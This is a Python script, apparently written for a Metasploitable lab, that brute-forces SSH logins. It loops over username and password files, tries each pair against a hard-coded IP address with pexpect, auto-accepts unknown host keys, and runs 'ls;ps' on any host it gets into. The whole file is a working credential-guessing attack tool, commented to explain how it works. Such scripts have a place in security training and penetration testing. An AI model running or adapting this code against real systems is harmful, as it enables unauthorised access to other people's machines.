#/usr/bin/python
# -*- coding: utf-8 -*-

import pexpect

Prompt = ['# ', '>>> ', '> ', '\$ ', 'msfadmin@metasploitable:~$']

def send_command(child,command) :                       # Simple function sending to a child object the command we want to execute through ssh
    print("[+] Successively connected to host. Executing the command {0} !".format(command))
    child.sendline(command)
    child.expect(Prompt)
    print child.before



def connect(username,host,password) :           # Function allowing to try to connect to a host ssh with given username and password
    
    ssh_newkey = "Are you sure you want to continue connecting"  # Line prompted in case of a new connection. We need to handle this case.
    connStr = "ssh " + username + "@" + host
    child = pexpect.spawn(connStr, timeout=1)      # Child represents our ssh connection. The timeout is relatively low because we are trying to bruteforce it (maybe it is too low, and it might give a timeout even when prompted the right username and password ?)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword"])   # ret will return 0 if there is a timeout, 1 if we got the ssh_newkey line, and 2 if we are just prompted for a password
    
    if ret == 0:
        print("[-] Error connecting")   # If there is a timeout, we print an error and exit
        return
    
    if ret == 1:        # We got prompted the ssh_newkey string. We send 'yes'
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, "[P|p]assword"])

        if ret == 0:
            print("[-] Error connecting")
            return
    child.sendline(password)    # We handled the case of a new connection, or of a timeout. We can now send the password
    child.expect(Prompt)        # If the connexion was successfull, we expect one of the standard ssh character
    return child
    


def main() :
    host='192.168.1.23'         # IP address of the target

    usernamesFile = open("usernames.txt", "r")
    passwordsFile = open("passwords.txt", "r") 
    for line in usernamesFile:                  
        passwordsFile.seek(0,0)                 # Back to the beginning of the second file in order to iterate through the first file again  

        usernameTest = line.strip()             # Getting rid of spaces and \n

        for line2 in passwordsFile:
            passwordTest = line2.strip()        # Same

            print("Trying:\nusername {0}password {1}".format(line, line2))
            try:                                                
                # We try to launch the connect function (and send_command). If the username and the password aren't right, child.spawn will timeout and send back an error.
                
                child=connect(usernameTest,host,passwordTest)
                send_command(child,'ls;ps')
            except:
            
                # If an error was sent, it means that the username or password weren't the right ones (or that the host wasn't up). We display an error.

                print("[-] Error connecting!")

    usernamesFile.close()
    passwordsFile.close()



if __name__ == '__main__' :
    main()


